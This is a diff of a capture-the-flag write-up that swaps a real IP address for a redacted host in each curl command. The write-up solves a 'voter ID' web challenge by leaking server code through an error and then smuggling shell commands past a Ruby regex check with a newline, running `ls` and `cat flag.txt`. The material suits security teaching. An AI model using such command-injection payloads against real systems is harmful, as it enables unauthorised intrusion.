@@ -18,7 +18,7 @@ http://redac.ted:8002/
 this link leads to a page with just a single input that asks for your 'early voter ID'
 
 ```bash
-$ curl "http://3.105.27.130:8002/"
+$ curl "http://re.da.ct.ed:8002/"
 <!DOCTYPE html>
 <html>
 <head>
@@ -46,7 +46,7 @@ $ curl "http://3.105.27.130:8002/"
 Submitting just the number `1` for out voter ID gets:
 
 ```bash
-$ curl -X POST "http://3.105.27.130:8002/" -d "voter_id=1"
+$ curl -X POST "http://re.da.ct.ed:8002/" -d "voter_id=1"
 <!DOCTYPE html>
 <html>
 <head>
@@ -81,7 +81,7 @@ $ curl -X POST "http://3.105.27.130:8002/" -d "voter_id=1"
 This reveals the regex that out input needs to pass: `/^[A-Za-z]{4}\d{4}$/`. How about putting in an input that is of the incorrect type and maybe seeing if any code is leaked in the error message
 
 ```bash
-$ curl -X POST "http://3.105.27.130:8002/" -d "voter_id[0]=1"
+$ curl -X POST "http://re.da.ct.ed:8002/" -d "voter_id[0]=1"
 NoMethodError: undefined method `match' for {"0"=>"1"}:Sinatra::IndifferentHash (NoMethodError)
 
   if !voter_id.match(/^[A-Za-z]{4}\d{4}$/)
@@ -147,7 +147,7 @@ So the first thought that pops into my mind is that if the passed in value is mu
 Let's test that:
 
 ```bash
-$ curl -X POST "http://3.105.27.130:8002/" -d "voter_id=AAAA0000
+$ curl -X POST "http://re.da.ct.ed:8002/" -d "voter_id=AAAA0000
 flag"
 <!DOCTYPE html>
 <html>
@@ -187,7 +187,7 @@ Now, looking back at the challenge it is called `Verification or Execution` we j
 To start with I discovered we could do RCE on the machine by just inputting any linux command
 
 ```bash
-$ curl -X POST "http://3.105.27.130:8002/" -d 'voter_id=AAAA0000
+$ curl -X POST "http://re.da.ct.ed:8002/" -d 'voter_id=AAAA0000
 ls'
 <!DOCTYPE html>
 <html>
@@ -236,7 +236,7 @@ votercheck.sh
 And there is the flag.txt file, so lets read it
 
 ```bash
-$ curl -X POST "http://3.105.27.130:8002/" -d 'voter_id=AAAA0000
+$ curl -X POST "http://re.da.ct.ed:8002/" -d 'voter_id=AAAA0000
 cat flag.txt' | grep secedu
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
